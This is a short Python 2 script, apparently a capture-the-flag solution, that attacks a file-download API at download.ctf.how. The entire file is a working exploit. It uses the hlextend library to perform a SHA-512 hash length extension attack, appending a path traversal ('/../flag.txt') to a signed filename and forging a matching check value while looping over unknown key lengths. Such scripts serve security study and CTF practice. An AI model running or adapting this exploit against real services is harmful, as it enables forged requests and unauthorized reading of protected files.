import hlextend
import requests
from urllib import quote

# Known information
sha = hlextend.new('sha512')
check = 'c4c51fd91e87e1bfe35ef2ed2d5f675452874d5b56a7c67eba57a169e889ee26fe795ecff2f55fcca712c368bb7be0c6c35f71c0f303c9f79b6029c06c57833e'

# Ensure original request works
r = requests.get(
    'https://download.ctf.how/api/download?file=flag&check={}'.format(check))
print r.text

# We don't know the keysize
for i in range(1, 10):
    file = quote(sha.extend('/../flag.txt', 'flag', i, check, raw=True))
    new_sha = sha.hexdigest()
    r = requests.get(
        'https://download.ctf.how/api/download?file={}&check={}'.format(file, new_sha))
    if r.status_code == requests.codes.ok:
        print r.text
